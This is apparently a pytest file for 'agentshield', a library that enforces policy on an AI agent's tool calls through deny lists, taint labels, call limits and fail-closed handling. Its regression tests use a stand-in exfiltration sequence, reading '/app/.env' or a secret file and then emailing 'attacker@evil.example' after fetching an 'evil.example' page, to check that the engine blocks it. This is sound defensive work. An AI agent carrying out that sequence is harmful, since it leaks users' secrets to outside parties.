"""The engine must decide every call, not only the ones a detector happens to flag.

Regressions for C1 (deny-lists were never consulted) and C2 (exfiltration was detected
and then downgraded instead of blocked).
"""

from __future__ import annotations

import random

import pytest

from agentshield import Label, Session, Shield, ToolCall, Verdict
from agentshield.engine import EnforcementEngine
from agentshield.exceptions import AgentShieldError, PolicyError
from agentshield.policy import load_policy

LABELS: dict[str, frozenset[Label]] = {
    "read_file": frozenset({Label.CONFIDENTIAL}),
    "web_fetch": frozenset({Label.UNTRUSTED, Label.EXTERNAL}),
    "send_email": frozenset({Label.EXTERNAL}),
    "calc": frozenset(),
    "bash": frozenset(),
}

MANIFEST = {
    "version": 2,
    "unlabelled_tools": "deny",
    "tools": {
        "read_file": {"labels": ["confidential"]},
        "web_fetch": {"labels": ["untrusted", "external"]},
        "send_email": {"labels": ["external"]},
        "calc": {},
        "bash": {"deny": True},
    },
    "flows": [
        {
            "name": "trifecta",
            "when": {"session_has": ["untrusted", "confidential"], "tool_has": ["external"]},
            "then": "ask",
        }
    ],
    "limits": {"max_tool_calls": 50, "max_identical_calls": 5},
}


def make_engine(**overrides: object) -> EnforcementEngine:
    return EnforcementEngine(load_policy({**MANIFEST, **overrides}))


# --- named regressions -----------------------------------------------------------------


def test_denied_tool_is_blocked_on_its_first_call() -> None:
    decision = make_engine().check(ToolCall("bash", {"command": "id"}), Session())
    assert decision.verdict is Verdict.DENY
    assert "denied" in decision.reason
    assert decision.rule == "tools.bash.deny"


def test_read_file_then_send_email_is_blocked() -> None:
    policy = load_policy(
        {
            "version": 2,
            "tools": {
                "read_file": {"labels": ["confidential"]},
                "send_email": {"labels": ["external"]},
            },
            "flows": [
                {
                    "name": "no-confidential-exfiltration",
                    "when": {"session_has": ["confidential"], "tool_has": ["external"]},
                    "then": "deny",
                }
            ],
        }
    )
    engine = EnforcementEngine(policy)
    session = Session()

    assert engine.check(ToolCall("read_file", {"path": "/app/.env"}), session).allowed
    engine.record(ToolCall("read_file", {"path": "/app/.env"}), session=session)

    decision = engine.check(ToolCall("send_email", {"to": "attacker@evil.example"}), session)
    assert decision.verdict is Verdict.DENY
    assert decision.rule == "no-confidential-exfiltration"


def test_strict_asks_before_the_lethal_trifecta() -> None:
    strict = EnforcementEngine(
        load_policy(
            {
                "extends": "strict",
                "tools": {
                    "read_file": {"labels": ["confidential"]},
                    "web_fetch": {"labels": ["untrusted", "external"]},
                    "send_email": {"labels": ["external"]},
                },
            }
        )
    )
    session = Session()
    for call in (
        ToolCall("web_fetch", {"url": "https://evil.example/page"}),
        ToolCall("read_file", {"path": "secret.txt"}),
    ):
        assert strict.check(call, session).allowed
        strict.record(call, session=session)

    decision = strict.check(ToolCall("send_email", {"to": "attacker@evil.example"}), session)
    assert decision.verdict is Verdict.ASK
    assert decision.rule == "untrusted-and-confidential-to-external"


# --- evaluation order ------------------------------------------------------------------


def test_unlabelled_tool_is_denied_by_default() -> None:
    decision = make_engine().check(ToolCall("mystery", {}), Session())
    assert decision.verdict is Verdict.DENY
    assert decision.rule == "unlabelled_tools"
    assert "not declared" in decision.reason


def test_unlabelled_default_can_be_ask() -> None:
    decision = make_engine(unlabelled_tools="ask").check(ToolCall("mystery", {}), Session())
    assert decision.verdict is Verdict.ASK


def test_unlabelled_default_can_be_allow() -> None:
    decision = make_engine(unlabelled_tools="allow").check(ToolCall("mystery", {}), Session())
    assert decision.verdict is Verdict.ALLOW


def test_tool_call_limit_denies_after_the_limit() -> None:
    engine = make_engine(limits={"max_tool_calls": 2})
    session = Session()
    for _ in range(2):
        assert engine.check(ToolCall("calc", {}), session).allowed
        engine.record(ToolCall("calc", {}), session=session)
    decision = engine.check(ToolCall("calc", {}), session)
    assert decision.verdict is Verdict.DENY
    assert decision.rule == "limits.max_tool_calls"


def test_identical_call_limit_denies_repeats() -> None:
    engine = make_engine(limits={"max_identical_calls": 2})
    session = Session()
    for _ in range(2):
        assert engine.check(ToolCall("calc", {}), session).allowed
        engine.record(ToolCall("calc", {}), session=session)
    assert engine.check(ToolCall("calc", {}), session).verdict is Verdict.DENY
    assert engine.check(ToolCall("read_file", {"path": "x"}), session).allowed


def test_deny_list_is_evaluated_before_limits() -> None:
    engine = make_engine(limits={"max_tool_calls": 1})
    session = Session()
    engine.record(ToolCall("calc", {}), session=session)
    decision = engine.check(ToolCall("bash", {}), session)
    assert decision.rule == "tools.bash.deny"


def test_a_limit_beats_an_ask_flow() -> None:
    # Without the taint this call is denied by the limit; taint must not turn it into ask.
    engine = make_engine(limits={"max_tool_calls": 2})
    session = Session()
    for call in (ToolCall("web_fetch", {}), ToolCall("read_file", {})):
        assert engine.check(call, session).allowed
        engine.record(call, session=session)
    decision = engine.check(ToolCall("send_email", {}), session)
    assert decision.rule == "limits.max_tool_calls"
    assert decision.verdict is Verdict.DENY


def test_a_deny_flow_beats_an_earlier_ask_flow() -> None:
    deny_flow = {"name": "no-email", "when": {"tool": "send_email"}, "then": "deny"}
    engine = make_engine(flows=[*MANIFEST["flows"], deny_flow])  # type: ignore[misc]
    session = Session(taint={Label.UNTRUSTED, Label.CONFIDENTIAL})
    decision = engine.check(ToolCall("send_email", {}), session)
    assert decision.rule == "no-email"
    assert decision.verdict is Verdict.DENY


def test_flows_are_evaluated_before_limits() -> None:
    engine = make_engine(limits={"max_tool_calls": 2})
    session = Session(taint={Label.UNTRUSTED, Label.CONFIDENTIAL})
    decision = engine.check(ToolCall("send_email", {}), session)
    assert decision.rule == "trifecta"
    assert decision.verdict is Verdict.ASK


# --- monitor mode ----------------------------------------------------------------------


def test_monitor_mode_reports_but_allows() -> None:
    monitor = make_engine(mode="monitor")
    decision = monitor.check(ToolCall("bash", {}), Session())
    assert decision.verdict is Verdict.ALLOW
    assert decision.rule == "tools.bash.deny"
    assert decision.reason.startswith("monitor: would deny:")


# --- state -----------------------------------------------------------------------------


def test_record_updates_taint_and_counters() -> None:
    engine = make_engine()
    session = Session()
    engine.record(ToolCall("read_file", {"path": "x"}), session=session)
    engine.record(ToolCall("read_file", {"path": "y"}), session=session)
    assert session.taint == {Label.CONFIDENTIAL}
    assert session.tool_calls == 2
    assert session.identical_calls["read_file"] == 2


def test_check_uses_the_current_session() -> None:
    shield = Shield.from_policy(MANIFEST)
    with shield.session() as session:
        assert shield.engine.check(ToolCall("bash", {})).verdict is Verdict.DENY
        assert session.tool_calls == 0


def test_without_a_session_every_call_is_denied() -> None:
    decision = make_engine().check(ToolCall("calc", {}))
    assert decision.verdict is Verdict.DENY
    assert decision.rule == "session"


def test_record_without_a_session_is_an_error() -> None:
    with pytest.raises(AgentShieldError, match="no active session"):
        make_engine().record(ToolCall("calc", {}))


# --- fail closed -----------------------------------------------------------------------


def test_internal_error_returns_deny(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = make_engine()

    def boom(call: ToolCall, session: Session | None) -> None:
        raise RuntimeError("detector exploded")

    monkeypatch.setattr(engine, "_decide", boom)
    decision = engine.check(ToolCall("calc", {}), Session())
    assert decision.verdict is Verdict.DENY
    assert decision.rule == "internal-error"
    assert "RuntimeError" in decision.reason


def test_a_policy_cannot_be_mutated_through_the_engine() -> None:
    enforcement = make_engine()
    with pytest.raises(ValueError):
        enforcement.policy.mode = "monitor"  # type: ignore[misc]


def test_invalid_flow_action_is_rejected() -> None:
    with pytest.raises(PolicyError, match="flows.0.then"):
        load_policy(
            {
                "version": 2,
                "tools": {"send_email": {"labels": ["external"]}},
                "flows": [{"name": "f", "when": {"tool_has": ["external"]}, "then": "allow"}],
            }
        )


# --- generated sequences ----------------------------------------------------------------


def test_random_sequences_never_allow_a_forbidden_call() -> None:
    """A few thousand generated call sequences, checked against the two invariants."""
    names = list(LABELS)
    rng = random.Random(20261015)
    seen_verdicts: set[Verdict] = set()

    for _ in range(2000):
        enforcement = make_engine()
        session = Session()
        for _ in range(rng.randint(1, 10)):
            name = rng.choice(names)
            decision = enforcement.check(ToolCall(name, {}), session)
            seen_verdicts.add(decision.verdict)

            if name == "bash":
                assert decision.verdict is not Verdict.ALLOW, "deny-listed tool was allowed"
            tainted = {Label.UNTRUSTED, Label.CONFIDENTIAL} <= session.taint
            if Label.EXTERNAL in LABELS[name] and tainted:
                assert decision.verdict is not Verdict.ALLOW, (
                    "external tool was allowed in a session holding untrusted and confidential data"
                )

            if decision.verdict is Verdict.DENY:
                continue
            enforcement.record(ToolCall(name, {}), session=session)

    assert seen_verdicts == {Verdict.ALLOW, Verdict.DENY, Verdict.ASK}
